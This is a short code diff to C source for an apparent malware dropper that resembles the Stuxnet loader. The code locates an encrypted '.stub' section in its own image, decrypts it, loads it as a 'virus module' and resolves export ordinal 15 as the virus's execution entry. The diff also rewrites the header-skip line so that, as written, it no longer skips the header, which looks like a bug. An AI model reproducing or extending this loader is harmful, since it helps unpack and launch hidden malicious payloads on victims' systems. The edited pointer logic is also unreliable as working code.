@@ -28,9 +28,8 @@ void LoadSTUBSection(void)
 	/* --->> Get the ".stub" section's RVA and Virtual Sizee <<--- */
 	if(!LocateSTUBSection((PVOID *)&pSectionSTUB, &pSectionVirtualSize)) return;
 	
-	/* --->> Start to decrypt from the 552 byte <<--- */
-	/* --->> Decrypt 49.8176 bytes <<--- */
 	DecryptSTUBSection((char *)(pSectionSTUB[0] + (UINT32)pSectionSTUB), pSectionSTUB[1]);// (552, 498176)
+	
 	if(!Setup(NULL, (PVOID)(*pSectionSTUB + (UINT32)pSectionSTUB), pSectionSTUB[1], &hVirusModule)) // (0, 552, 498176, ...)
 	{
 		pVirusExecEntry = GetProcAddress(hVirusModule, (LPCSTR)15);
@@ -122,7 +121,11 @@ bool LocateSTUBSection(PVOID *pRawSectionSTUB, INT32 *pSectionVirtualSize)
 	if(*pSectionSTUB != STUB_INTEGRITY_MARK)
 		return FALSE;
 	
-	*pRawSectionSTUB     = pSectionSTUB + 0x4; // Stub w/o the header
+	/* 
+	* Remove the headers
+	* pSectionSTUB++ because it's an array of 4-byte values
+	*/
+	*pRawSectionSTUB     = pSectionSTUB++;
 	*pSectionVirtualSize = pImageSection->SizeOfRawData - 0x4; // Size - header
 	
 	return TRUE;
